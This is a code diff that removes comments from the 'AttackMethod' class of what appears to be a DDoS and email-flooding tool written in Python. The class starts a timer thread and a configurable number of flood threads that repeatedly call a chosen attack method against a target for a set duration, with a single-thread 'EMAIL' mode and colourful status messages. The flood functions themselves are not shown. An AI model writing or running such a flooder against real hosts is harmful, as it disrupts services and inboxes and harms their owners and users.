@@ -30,12 +30,10 @@ def GetMethodByName(method):
         )
 
 
-""" Class to control attack methods """
 
 
 class AttackMethod:
 
-    # Constructor
     def __init__(self, name, duration, threads, target):
         self.name = name
         self.duration = duration
@@ -45,18 +43,15 @@ class AttackMethod:
         self.threads = []
         self.is_running = False
 
-    # Enter
     def __enter__(self):
         InternetConnectionCheck()
         self.method = GetMethodByName(self.name)
         self.target = GetTargetAddress(self.target_name, self.name)
         return self
 
-    # Exit
     def __exit__(self, exc_type, exc_val, exc_tb):
         print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack completed!{Fore.RESET}")
 
-    # Run time checker
     def __RunTimer(self):
         __stopTime = time() + self.duration
         while time() < __stopTime:
@@ -65,24 +60,18 @@ class AttackMethod:
             sleep(1)
         self.is_running = False
 
-    # Run flooder
     def __RunFlood(self):
         while self.is_running:
             self.method(self.target)
 
-    # Start threads
     def __RunThreads(self):
-        # Run timer thread
         thread = Thread(target=self.__RunTimer)
         thread.start()
-        # Check if 1 thread
         if self.name == "EMAIL":
             self.threads_count = 1
-        # Create flood threads
         for _ in range(self.threads_count):
             thread = Thread(target=self.__RunFlood)
             self.threads.append(thread)
-        # Start flood threads
         with Spinner(
             label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
             total=100,
@@ -90,14 +79,12 @@ class AttackMethod:
             for index, thread in enumerate(self.threads):
                 thread.start()
                 spinner.step(100 / len(self.threads) * (index + 1))
-        # Wait flood threads for stop
         for index, thread in enumerate(self.threads):
             thread.join()
             print(
                 f"{Fore.GREEN}[+] {Fore.YELLOW}Stopped thread {index + 1}.{Fore.RESET}"
             )
 
-    # Start ddos attack
     def Start(self):
         if self.name == "EMAIL":
             target = self.target_name
@@ -116,7 +103,6 @@ class AttackMethod:
             print(
                 f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads..{Fore.RESET}"
             )
-            # Wait all threads for stop
             for thread in self.threads:
                 thread.join()
         except Exception as err:
